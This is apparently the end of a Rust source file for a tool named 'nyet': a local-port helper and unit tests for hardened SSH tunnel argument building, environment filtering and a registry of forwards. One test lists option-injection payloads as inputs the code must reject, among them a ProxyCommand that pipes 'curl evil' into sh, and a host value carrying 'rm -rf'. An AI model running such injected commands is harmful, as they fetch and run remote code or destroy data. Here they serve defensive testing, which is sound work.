/// be **pre**-captured: a squatter could sit on it before nyet ever runs, and
/// hold it as a denial-of-service handle. A random port can only be raced in the
/// instant it frees. The registry file (0700 dir, our uid) supplies the identity
/// a derived port would have given.
///
/// ponytail: TOCTOU race between releasing this socket and ssh binding it. With
/// forward reuse the window is now paid once per forward rather than once per
/// call. It is tiny and a collision just fails the tunnel with a clear error;
/// retry-on-EADDRINUSE if it ever bites.
fn free_local_port() -> Result<u16, TunnelError> {
    let listener = TcpListener::bind("127.0.0.1:0").map_err(|e| TunnelError {
        message: format!("could not reserve a local port for the SSH tunnel: {e}"),
        hint: "check that the loopback interface is available".to_string(),
    })?;
    let port = listener.local_addr().map_err(|e| TunnelError {
        message: format!("could not read the reserved local port: {e}"),
        hint: "check that the loopback interface is available".to_string(),
    })?;
    Ok(port.port())
    // listener dropped here -> port released for ssh.
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_user_host_port() {
        let s = parse_host("deploy@bastion.corp:22").unwrap();
        assert_eq!(s.destination, "deploy@bastion.corp");
        assert_eq!(s.port, NonZeroU16::new(22));
    }

    #[test]
    fn parses_host_without_port_or_user() {
        let s = parse_host("bastion.corp").unwrap();
        assert_eq!(s.destination, "bastion.corp");
        assert_eq!(s.port, None);
        let s = parse_host("bastion.corp:2222").unwrap();
        assert_eq!(s.destination, "bastion.corp");
        assert_eq!(s.port, NonZeroU16::new(2222));
    }

    #[test]
    fn rejects_non_numeric_empty_and_zero_port() {
        assert!(parse_host("bastion.corp:notaport").is_err());
        assert!(parse_host("deploy@:22").is_err());
        assert!(parse_host("").is_err());
        // Port 0 is rejected (ssh refuses it) — NonZeroU16.
        assert!(parse_host("bastion:0").is_err());
        assert!(parse_remote("host:0").is_err());
    }

    #[test]
    fn parse_trims_and_canonicalizes() {
        // Leading/trailing whitespace must not survive into the argv.
        let s = parse_host("  deploy@bastion.corp:22  ").unwrap();
        assert_eq!(s.destination, "deploy@bastion.corp");
        assert_eq!(s.port, NonZeroU16::new(22));
        assert_eq!(
            parse_remote("  db.internal:5432 ").unwrap(),
            "db.internal:5432"
        );
        assert_eq!(parse_control_persist("  15m ").unwrap(), "15m");
    }

    #[test]
    fn keep_env_allowlists_ssh_vars_and_drops_secrets() {
        for keep in ["HOME", "PATH", "SSH_AUTH_SOCK", "USER", "LANG", "LC_ALL"] {
            assert!(keep_env_key(keep), "{keep} should be kept");
        }
        // The DB password nyet resolved and anything else must be dropped.
        for drop in [
            "PROD_DB_PASSWORD",
            "NYET_PG_TEST_PW",
            "AWS_SECRET_ACCESS_KEY",
        ] {
            assert!(!keep_env_key(drop), "{drop} must be dropped");
        }
    }

    /// The RCE guard: an option-injection host (leading `-`, or after a
    /// substituted ${VAR}) is rejected before it can reach ssh's argv.
    #[test]
    fn rejects_ssh_option_injection() {
        for host in [
            "-oProxyCommand=sh -c \"curl evil|sh\"",
            "-oProxyCommand=x",
            "-Fnope",
            "deploy@-oProxyCommand=x", // user side
            "host name",               // space
            "host;rm -rf",             // shell meta
            "-",                       // lone dash
        ] {
            assert!(parse_host(host).is_err(), "must reject {host:?}");
        }
        // remote is embedded after 127.0.0.1: but still validated.
        for remote in [
            "-oProxyCommand=x:5432",
            "db.internal:notaport",
            "db.internal",
        ] {
            assert!(
                parse_remote(remote).is_err(),
                "must reject remote {remote:?}"
            );
        }
        assert_eq!(
            parse_remote("db.internal:5432").unwrap(),
            "db.internal:5432"
        );
    }

    #[test]
    fn ssh_args_carry_all_hardening_options_and_forward() {
        let spec = parse_host("deploy@bastion.corp:22").unwrap();
        let args = ssh_args(
            &spec,
            "db.internal:5432",
            "15m",
            Some("/run/user/1000/nyet/cm-%C"),
            10,
            54321,
            true, // background (master mode)
        );
        assert!(args.contains(&"127.0.0.1:54321:db.internal:5432".to_string()));
        assert!(args.contains(&"-f".to_string()));
        assert!(args.contains(&"-N".to_string()));
        for opt in [
            "ControlMaster=auto",
            "ControlPersist=15m",
            "ExitOnForwardFailure=yes",
            "BatchMode=yes",
            "ConnectTimeout=10",
            "ControlPath=/run/user/1000/nyet/cm-%C",
        ] {
            assert!(args.contains(&opt.to_string()), "missing -o {opt}");
        }
        assert!(args.windows(2).any(|w| w == ["-p", "22"]));
        assert_eq!(args.last().unwrap(), "deploy@bastion.corp");
    }

    #[test]
    fn ssh_args_foreground_emits_control_path_none() {
        let spec = parse_host("bastion.corp").unwrap();
        let args = ssh_args(&spec, "10.0.0.1:5432", "1h", None, 5, 40000, false);
        // Standalone (child) mode: no -f, no -p, and ControlPath explicitly
        // `none` (not omitted) so ~/.ssh/config can't inject a stale path.
        assert!(!args.contains(&"-f".to_string()));
        assert!(args.contains(&"ControlPersist=1h".to_string()));
        assert!(args.contains(&"ConnectTimeout=5".to_string()));
        assert!(!args.contains(&"-p".to_string()));
        assert!(args.contains(&"ControlPath=none".to_string()));
        assert_eq!(args.last().unwrap(), "bastion.corp");
    }

    #[test]
    fn cancel_args_target_the_specific_forward() {
        let spec = parse_host("deploy@bastion.corp:22").unwrap();
        let args = cancel_args(
            &spec,
            "db.internal:5432",
            "/run/user/1000/nyet/cm-%C",
            54321,
        );
        assert!(args.windows(2).any(|w| w == ["-O", "cancel"]));
        assert!(args.contains(&"127.0.0.1:54321:db.internal:5432".to_string()));
        assert!(args.contains(&"ControlPath=/run/user/1000/nyet/cm-%C".to_string()));
        assert!(args.windows(2).any(|w| w == ["-p", "22"]));
        assert_eq!(args.last().unwrap(), "deploy@bastion.corp");
    }

    #[test]
    fn control_persist_grammar() {
        // yes/no, bare seconds, single unit, and combinations all pass.
        // `1h30` = 1h + 30s (trailing bare-seconds run) is valid too.
        for ok in [
            "yes", "no", "0", "30", "30s", "15m", "1h", "2h30m", "900", "1h30",
        ] {
            assert!(validate_control_persist(ok).is_ok(), "{ok} should pass");
        }
        // Leading unit, bad unit, bare words, empty — all rejected.
        for bad in ["s1", "fifteen", "", "15x", "m", "abc"] {
            assert!(validate_control_persist(bad).is_err(), "{bad} should fail");
        }
    }

    #[test]
    fn control_path_length_guard() {
        // A short path is fine; a deep one (e.g. a nested temp HOME) is skipped
        // so ssh never errors "ControlPath too long".
        assert!(!control_path_too_long(std::path::Path::new(
            "/run/user/1000/nyet/cm-%C"
        )));
        let deep = format!("/{}/nyet/cm-%C", "a".repeat(90));
        assert!(control_path_too_long(std::path::Path::new(&deep)));
    }

    #[test]
    fn reuse_needs_both_the_opt_in_and_a_persistent_master() {
        assert!(reuse_allowed(true, "15m"));
        assert!(reuse_allowed(true, "yes"));
        // The opt-out, and the "no background master" setting that implies it —
        // a `-N` master with ControlPersist=no never exits, so a forward kept
        // behind it would have no TTL at all.
        assert!(!reuse_allowed(false, "15m"));
        assert!(!reuse_allowed(true, "no"));
        assert!(!reuse_allowed(true, "NO"));
    }

    #[test]
    fn check_args_ask_the_master_on_this_control_path() {
        let spec = parse_host("deploy@bastion.corp:22").unwrap();
        let args = check_args(&spec, "/run/user/1000/nyet/cm-%C");
        assert!(args.windows(2).any(|w| w == ["-O", "check"]));
        assert!(args.contains(&"ControlPath=/run/user/1000/nyet/cm-%C".to_string()));
        assert!(args.windows(2).any(|w| w == ["-p", "22"]));
        assert_eq!(args.last().unwrap(), "deploy@bastion.corp");
    }

    #[test]
    fn master_pid_is_read_from_the_check_reply() {
        assert_eq!(
            parse_master_pid("Master running (pid=12345)\r\n"),
            Some(12345)
        );
        // Anything else is "cannot prove ownership" -> no reuse (fail closed).
        for junk in [
            "",
            "Control socket connect(/x): No such file or directory",
            "Master running (pid=)",
            "Master running (pid=abc)",
        ] {
            assert_eq!(parse_master_pid(junk), None, "{junk:?}");
        }
    }

    #[test]
    fn registry_entry_round_trips_and_fails_closed_on_junk() {
        let entry = Entry {
            port: 54321,
            master_pid: 12345,
            created: 1_753_600_000,
            dest: "deploy@bastion.corp".to_string(),
            ssh_port: 22,
            remote: "db.internal:5432".to_string(),
        };
        assert_eq!(parse_entry(&render_entry(&entry)), Some(entry));
        // A truncated write, a future format, an unknown key, a bad number:
        // every one of them means "do not adopt that forward".
        for junk in [
            "",
            "v=1\nport=54321\n",
            "v=2\nport=1\npid=1\ncreated=1\ndest=a\nsshport=0\nremote=b:1\n",
            "v=1\nport=1\npid=1\ncreated=1\ndest=a\nsshport=0\nremote=b:1\nextra=x\n",
            "v=1\nport=99999\npid=1\ncreated=1\ndest=a\nsshport=0\nremote=b:1\n",
            "garbage",
        ] {
            assert_eq!(parse_entry(junk), None, "{junk:?}");
        }
    }

    /// The registry slot is per (destination, ssh port, remote) — that pair IS
    /// the "at most one forward" key.
    #[test]
    fn registry_name_is_one_slot_per_pair() {
        let name = |host: &str, remote: &str| {
            registry_name(&parse_host(host).unwrap(), &parse_remote(remote).unwrap())
        };
        assert_eq!(
            name("deploy@bastion.corp:22", "db.internal:5432"),
            "fwd-deploy_bastion.corp-22-db.internal_5432"
        );
        // Same pair -> same slot; a different bastion, ssh port or remote -> a
        // different slot (one forward each).
        assert_eq!(
            name("deploy@bastion.corp:22", "db.internal:5432"),
            name("  deploy@bastion.corp:22 ", "db.internal:5432 ")
        );
        for other in [
            name("deploy@bastion.corp:2222", "db.internal:5432"),
            name("other@bastion.corp:22", "db.internal:5432"),
            name("deploy@bastion.corp:22", "db.internal:5433"),
            name("deploy@bastion.corp", "db.internal:5432"),
        ] {
            assert_ne!(name("deploy@bastion.corp:22", "db.internal:5432"), other);
        }
    }

    /// The cleanup command must be `-O exit`, never the surgical `-O cancel`:
    /// cancelling one forward leaves the master alive, and that is exactly the
    /// state in which adoption cannot tell our freed port from a stranger's.
    #[test]
    fn kill_command_kills_the_master_not_just_the_forward() {
        let spec = parse_host("deploy@bastion.corp:22").unwrap();
        let cmd = kill_command(&spec, "/run/user/1000/nyet/cm-%C");
        assert_eq!(
            cmd,
            "ssh -O exit -o 'ControlPath=/run/user/1000/nyet/cm-%C' -p 22 deploy@bastion.corp"
        );
        assert!(!cmd.contains("cancel"));
        // A HOME with a space must not produce a command that breaks apart.
        let with_space = kill_command(&spec, "/Users/a b/.ssh/nyet/cm-%C");
        assert!(with_space.contains("'ControlPath=/Users/a b/.ssh/nyet/cm-%C'"));
    }

    #[test]
    fn private_dir_check_rejects_a_shared_directory() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = std::env::temp_dir().join(format!("nyet-dirtest-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        create_private_dir(&tmp).unwrap();
        assert!(is_private_dir(&tmp), "a dir we created must be private");
        // Someone else's mode (or a loose umask) -> no reuse.
        std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(!is_private_dir(&tmp));
        std::fs::remove_dir_all(&tmp).unwrap();
        assert!(!is_private_dir(&tmp), "a missing dir is not private");
    }

    /// "Released, therefore still free" is inherently racy — it is the very
    /// TOCTOU the real forward lives with (see `free_local_port`). Inside one
    /// test binary the race is not hypothetical: every test that binds port 0
    /// competes for the same ephemeral range and the kernel hands them out in
    /// order, so a port released here is a prime candidate for the next
    /// bind(0). Retrying keeps the assertion honest — a genuinely broken probe
    /// fails every attempt, a lost race does not fail the build.
    fn eventually(what: &str, mut attempt: impl FnMut() -> bool) {
        for _ in 0..20 {
            if attempt() {
                return;
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        panic!("{what}: failed 20 times running — a real failure, not a lost race");
    }

    #[test]
    fn port_is_free_detects_a_listener() {
        eventually("a released port reads as free", || {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let port = listener.local_addr().unwrap().port();
            // Occupied while the listener lives, free once it is dropped: this
            // is the "is the forward still there" probe, and it sends nothing.
            // The occupied half cannot race, so it stays a hard assertion.
            assert!(!port_is_free(port), "a live listener must read as occupied");
            drop(listener);
            port_is_free(port)
        });
    }

    #[test]
    fn free_local_port_returns_a_usable_port() {
        eventually("the reserved port is bindable afterwards", || {
            let port = free_local_port().unwrap();
            assert_ne!(port, 0);
            TcpListener::bind(("127.0.0.1", port)).is_ok()
        });
    }
}
